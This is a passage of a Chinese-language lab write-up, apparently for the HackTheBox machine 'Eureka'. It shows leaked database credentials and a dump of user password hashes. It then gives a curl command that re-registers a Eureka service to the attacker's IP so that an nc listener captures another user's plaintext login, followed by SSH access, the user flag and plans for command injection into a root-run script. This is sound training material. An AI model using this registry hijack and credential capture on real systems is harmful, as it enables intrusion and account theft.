\nudp                   UNCONN                  0                       0                                                         *:37093                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:49730                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:52181                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:36551                                              *:*                                            \ntcp                   LISTEN                  0                       511                                                 0.0.0.0:80                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                          127.0.0.53%lo:53                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       128                                                 0.0.0.0:22                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       80                                                127.0.0.1:3306                                         0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                     [::ffff:127.0.0.1]:8080                                               *:*                                            \ntcp                   LISTEN                  0                       511                                                    [::]:80                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8081                                               *:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8082                                               *:*                                            \ntcp                   LISTEN                  0                       128                                                    [::]:22                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                                       *:8761                                               *:*  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结合之前的信息，我们去访问一下数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eusername = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eoscar190@eureka:/home$ mysql -uoscar190 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 400\nServer version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. Type \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current input statement.\n\nMariaDB [(none)]\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eariaDB [Furni_WebApp_DB]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from SPRING_SESSION;                                                                                                                                                                            \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+                                                 \n| PRIMARY_ID                           | SESSION_ID                           | CREATION_TIME | LAST_ACCESS_TIME | MAX_INACTIVE_INTERVAL | EXPIRY_TIME   | PRINCIPAL_NAME         |                                                 \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+ \n| 10233918-ae1b-42fb-be6f-5f9964cf1bd4 | 4e178510-cbab-422a-9aec-2d220d4aac84 | 1745739662223 |    1745739664438 |                  1800 | 1745741464438 | miranda.wise@furni.htb |                                                 \n| 13332183-199d-4684-ada9-cb6d4a369d3d | 291a60aa-1a92-4f7b-b46e-b2050b972752 | 1745739481031 |    1745739481182 |                  1800 | 1745741281182 | miranda.wise@furni.htb |  \n| fa2e36a0-151d-486f-b2c3-0a620a9c21f5 | 19028783-c10e-44b3-9770-8e7137cde452 | 1745739541041 |    1745739541597 |                  1800 | 1745741341597 | miranda.wise@furni.htb |\n| fcbcfc2f-66a4-41c7-97cc-36cb09cf2e83 | 6dde7be1-48d9-4188-948b-947be5308ab6 | 1745739181290 |    1745739181563 |                  1800 | 1745740981563 | miranda.wise@furni.htb |\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [Furni_WebApp_DB]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | first_name | last_name | email                   | password                                                     | is_staff |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10\u003cspan class=\"hljs-variable\"\u003e$J4yap5ZxviliZO9jBCuSdeD\u003c/span\u003e.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |\n|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10\u003cspan class=\"hljs-variable\"\u003e$DgUDWpxipW2Yt7UcKxzvweB7FXoV\u003c/span\u003e/LFxlJG8yuL56NyUMMLr5uBuK |        0 |\n|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10\u003cspan class=\"hljs-variable\"\u003e$3LDYl5QEt4K4u8vLWMGH8eDA\u003c/span\u003e/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |\n|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10\u003cspan class=\"hljs-variable\"\u003e$4TLCSlEfYrNDFfPDQ5z4p\u003c/span\u003e.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |\n|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10\u003cspan class=\"hljs-variable\"\u003e$T4L873JALnbXH10tq\u003c/span\u003e.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |\n| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10\u003cspan class=\"hljs-variable\"\u003e$ye9a40a7KOyBJKUai2qxY\u003c/span\u003e.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |\n| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10\u003cspan class=\"hljs-variable\"\u003e$GZQOgzb4N1xVs3ALpnuqGeId5\u003c/span\u003e/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |\n| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10\u003cspan class=\"hljs-variable\"\u003e$J93xmU0\u003c/span\u003e.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |\n| 15 | \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e       | \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e      | \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e@test.com           | $2a$10\u003cspan class=\"hljs-variable\"\u003e$KhEKRdaMX4axuvRkGw3wLuehQMBPMVlQ2astA3sR\u003c/span\u003e.toEjh63rbQWG |        0 |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n9 rows \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.000 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将密码放后台进行爆破\u003c/p\u003e\n\u003cp\u003e然后上传 \u003ccode\u003epspy64\u003c/code\u003e 监测一下后台，发现 \u003ccode\u003e/opt/log_analyse.sh\u003c/code\u003e 和 \u003ccode\u003e/opt/scripts/miranda-Login-Simulator.sh\u003c/code\u003e 两个脚本，第二个脚本应该是模拟\u003ccode\u003emiranda\u003c/code\u003e用户登录Web然后在数据库中留下\u003ccode\u003eSESSION\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e2025/04/27 07:53:09 CMD: UID=0     PID=2026725 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=0     PID=2026723 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=1000  PID=2026682 | ./pspy64                                                                                                                                                                           \n2025/04/27 07:53:09 CMD: UID=0     PID=2026681 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cac\nhe-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YWQ0ZWE5YTAtODgzYi00ZGNjLWIyY2EtYjg0NTUxMTkxMTdm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/t\nmp.Wgy2TkeN8L --insecure -i                                                                                                                                                                                                         \n2025/04/27 07:53:09 CMD: UID=0     PID=2026601 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh                                                                                                                                  \n2025/04/27 07:53:09 CMD: UID=0     PID=2026600 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么就是说在一定时间会运行该脚本，并且携带\u003ccode\u003emiranda\u003c/code\u003e的账户密码去进行登录。\u003c/p\u003e\n\u003cp\u003e现在我们应该去通过某种方式去获得数据包\u003c/p\u003e\n\u003ch3\u003eSpring Eureka 截取流量\u003c/h3\u003e\n\u003cp\u003e佬们分享了一篇文章：\u003ca href=\"https://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539\"\u003ehttps://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e其中就有关于\u003cstrong\u003e流量劫持\u003c/strong\u003e的，大致就是：攻击者将注册 \u003cem\u003e\u003cstrong\u003ewebservice\u003c/strong\u003e\u003c/em\u003e 实例并将其指向恶意服务器，或者替换掉原本的实例，在靶机中可能是 \u003cstrong\u003eUSER-MANAGEMENT-SERVICE\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从 \u003ccode\u003eheapdump\u003c/code\u003e 中导出的数据中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以知道 Eureka Client，默认要连接的 Eureka Server 地址是 \u003ccode\u003ehttp://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\u003c/code\u003e，而且访问时要用账号密码认证。\u003c/p\u003e\n\u003cp\u003e需要使用本地地址进行访问，那么就要用 \u003ccode\u003eSSH\u003c/code\u003e 将端口转发出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003essh -L 8761:localhost:8761 oscar190@10.10.11.66\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e监听端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后查看 \u003ccode\u003e/eureka/apps/USER-MANAGEMENT-SERVICE\u003c/code\u003e 原本的内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka curl \u003cspan class=\"hljs-string\"\u003e'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e\"Accept: application/json\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\n  \u003cspan class=\"hljs-string\"\u003e\"application\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"USER-MANAGEMENT-SERVICE\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"instance\"\u003c/span\u003e: [\n      {\n        \u003cspan class=\"hljs-string\"\u003e\"instanceId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"192.168.40.130:user-management-service:6969\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"hostName\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"192.168.40.130\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"USER-MANAGEMENT-SERVICE\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"ipAddr\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"192.168.40.130\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"status\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"UP\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"overriddenStatus\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"UNKNOWN\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"port\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"$\"\u003c/span\u003e: 6969,\n          \u003cspan class=\"hljs-string\"\u003e\"@enabled\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"securePort\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"$\"\u003c/span\u003e: 9443,\n          \u003cspan class=\"hljs-string\"\u003e\"@enabled\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"countryId\"\u003c/span\u003e: 1,\n        \u003cspan class=\"hljs-string\"\u003e\"dataCenterInfo\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"@class\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"com.netflix.appinfo.InstanceInfo\u003cspan class=\"hljs-variable\"\u003e$DefaultDataCenterInfo\u003c/span\u003e\"\u003c/span\u003e,\n          \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"MyOwn\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"leaseInfo\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"renewalIntervalInSecs\"\u003c/span\u003e: 30,\n          \u003cspan class=\"hljs-string\"\u003e\"durationInSecs\"\u003c/span\u003e: 90,\n          \u003cspan class=\"hljs-string\"\u003e\"registrationTimestamp\"\u003c/span\u003e: 1745749189827,\n          \u003cspan class=\"hljs-string\"\u003e\"lastRenewalTimestamp\"\u003c/span\u003e: 1745749189827,\n          \u003cspan class=\"hljs-string\"\u003e\"evictionTimestamp\"\u003c/span\u003e: 0,\n          \u003cspan class=\"hljs-string\"\u003e\"serviceUpTimestamp\"\u003c/span\u003e: 1745749189827\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"zone\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"default\"\u003c/span\u003e,\n          \u003cspan class=\"hljs-string\"\u003e\"management.port\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"6969\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"homePageUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://192.168.40.130:6969/\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"statusPageUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://192.168.40.130:6969/info\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"healthCheckUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://192.168.40.130:6969/health\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"secureHealthCheckUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"vipAddress\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"user-management-service\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"secureVipAddress\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"user-management-service\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"isCoordinatingDiscoveryServer\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"lastUpdatedTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1745749189827\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"lastDirtyTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1745750384661\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"actionType\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ADDED\"\u003c/span\u003e\n      },\n      {\n        \u003cspan class=\"hljs-string\"\u003e\"instanceId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"localhost:USER-MANAGEMENT-SERVICE:8081\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"hostName\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"USER-MANAGEMENT-SERVICE\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"ipAddr\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"10.10.11.66\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"status\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"UP\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"overriddenStatus\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"UNKNOWN\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"port\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"$\"\u003c/span\u003e: 8081,\n          \u003cspan class=\"hljs-string\"\u003e\"@enabled\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"securePort\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"$\"\u003c/span\u003e: 443,\n          \u003cspan class=\"hljs-string\"\u003e\"@enabled\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"countryId\"\u003c/span\u003e: 1,\n        \u003cspan class=\"hljs-string\"\u003e\"dataCenterInfo\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"@class\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"com.netflix.appinfo.InstanceInfo\u003cspan class=\"hljs-variable\"\u003e$DefaultDataCenterInfo\u003c/span\u003e\"\u003c/span\u003e,\n          \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"MyOwn\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"leaseInfo\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"renewalIntervalInSecs\"\u003c/span\u003e: 30,\n          \u003cspan class=\"hljs-string\"\u003e\"durationInSecs\"\u003c/span\u003e: 90,\n          \u003cspan class=\"hljs-string\"\u003e\"registrationTimestamp\"\u003c/span\u003e: 1745747961808,\n          \u003cspan class=\"hljs-string\"\u003e\"lastRenewalTimestamp\"\u003c/span\u003e: 1745755807954,\n          \u003cspan class=\"hljs-string\"\u003e\"evictionTimestamp\"\u003c/span\u003e: 0,\n          \u003cspan class=\"hljs-string\"\u003e\"serviceUpTimestamp\"\u003c/span\u003e: 1745747961808\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n          \u003cspan class=\"hljs-string\"\u003e\"management.port\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"8081\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"homePageUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://localhost:8081/\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"statusPageUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://localhost:8081/actuator/info\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"healthCheckUrl\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"http://localhost:8081/actuator/health\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"vipAddress\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"USER-MANAGEMENT-SERVICE\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"secureVipAddress\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"USER-MANAGEMENT-SERVICE\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"isCoordinatingDiscoveryServer\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"lastUpdatedTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1745747961808\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"lastDirtyTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"1745747961026\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"actionType\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ADDED\"\u003c/span\u003e\n      }\n    ]\n  }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造恶意数据包，不需要全部都添加，慢慢测试即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurl \u003cspan class=\"hljs-string\"\u003e'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'Content-Type: application/json'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'{\n  \"instance\": {\n\t  \"hostName\": \"10.10.16.59\",\n    \"instanceId\": \"USER-MANAGEMENT-SERVICE\",\n    \"app\": \"USER-MANAGEMENT-SERVICE\",\n    \"ipAddr\": \"10.10.16.59\",\n    \"vipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"secureVipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"dataCenterInfo\": {\n      \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n      \"name\": \"MyOwn\"\n    },\n    \"status\": \"UP\",\n    \"port\": {\n      \"$\": 8081,\n      \"@enabled\": \"true\"\n    }\n  }\n}'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们的端口就会捕获到数据包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\nconnect to [10.10.16.59] from eureka.htb [10.10.11.66] 43346\nPOST /login HTTP/1.1\nX-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1,127.0.0.1\nX-Forwarded-Proto: http,http\nContent-Length: 168\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSION=ZjljOWMxOTctMWMyNS00YThkLThlNzItM2RhMDcxYTdkOTk3\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nForwarded: proto=http;host=furni.htb;\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"127.0.0.1:45412\"\u003c/span\u003e\nX-Forwarded-Port: 80\nX-Forwarded-Host: furni.htb\nhost: 10.10.16.59:8081\n\nusername=miranda.wise%40furni.htb\u0026#x26;password=IL%21veT0Be%26BeT0L0ve\u0026#x26;_csrf=IcxoURYl9qB2QGXTrE_ozcieiecjjQ056cY7bHQ7wAynOgBAFv9bMicVwZBbclLqlGLc9P74pN9HvDUUi6ADDxcO-DTEXjEk\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到 \u003ccode\u003emiranda\u003c/code\u003e 的账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eusername=miranda.wise@furni.htb\u0026#x26;password=IL!veT0Be\u0026#x26;BeT0L0ve\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eSSH\u003c/code\u003e 登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka ssh miranda-wise@10.10.11.66\nmiranda-wise@10.10.11.66\u003cspan class=\"hljs-string\"\u003e's password: \nLast login: Sun Apr 27 12:40:29 2025 from 10.10.16.59\nmiranda-wise@eureka:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到 user.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n1c0182b3b229fff1f28a469053a94c36\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e使用了 Linpeas.sh 进行收集后，没找到什么有趣的信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e═══════════════════════════════╣ Basic information ╠═══════════════════════════════\n                               ╚═══════════════════╝\nOS: Linux version 5.4.0-214-generic (buildd@lcy02-amd64-062) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) \u003cspan class=\"hljs-comment\"\u003e#234-Ubuntu SMP Fri Mar 14 23:50:27 UTC 2025\u003c/span\u003e\nUser \u0026#x26; Groups: uid=1001(miranda-wise) gid=1002(miranda-wise) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1002(miranda-wise),1003(developers)\nHostname: eureka\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e脚本分析\u003c/h3\u003e\n\u003cp\u003e又回到之前的脚本处，想起来使用 \u003ccode\u003epspy64\u003c/code\u003e 进行检测的时候还有另外一个脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e2025/04/28 05:00:41 CMD: UID=0     PID=2047217 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是以 \u003ccode\u003eroot\u003c/code\u003e 身份运行的，并且我们对 \u003ccode\u003e/var/www/web/user-management-service\u003c/code\u003e 目录有删除的权限，但是对 \u003ccode\u003eapplication.log\u003c/code\u003e 没有写的权限，但是我们可以删除了日志文件后再创建一个，我们就有写权限了，所以我们现在要找到脚本中是否存在命令注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e╔══════════╣ Interesting GROUP writable files (not \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e Home) (max 200)\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files\n  Group developers:\n/var/www/web    \n/var/www/web/user-management-service\n/var/www/web/user-management-service/target \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e分析脚本（喂给 \u003ccode\u003eGPT\u003c/code\u003e）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 颜色定义，用于输出彩色信息\u003c/span\u003e\nGREEN=\u003cspan class=\"hljs-string\"\u003e'\\033[0;32m'\u003c/span\u003e      \u003cspan class=\"hljs-comment\"\u003e# 绿色，用于成功消息\u003c/span\u003e\nRED=\u003cspan class=\"hljs-string\"\u003e'\\033[0;31m'\u003c/span\u003e        \u003cspan class=\"hljs-comment\"\u003e# 红色，用于错误消息\u003c/span\u003e\nYELLOW=\u003cspan class=\"hljs-string\"\u003e'\\033[1;33m'\u003c/span\u003e     \u003cspan class=\"hljs-comment\"\u003e# 黄色，用于警告消息\u003c/span\u003e\nBLUE=\u003cspan class=\"hljs-string\"\u003e'\\033[0;34m'\u003c/span\u003e       \u003cspan class=\"hljs-comment\"\u003e# 蓝色，用于信息消息\u003c/span\u003e\nCYAN=\u003cspan class=\"hljs-string\"\u003e'\\033[0;36m'\u003c/span\u003e       \u003cspan class=\"hljs-comment\"\u003e# 青色，用于一般信息\u003c/span\u003e\nRESET=\u003cspan class=\"hljs-string\"\u003e'\\033[0m'\u003c/span\u003e         \u003cspan 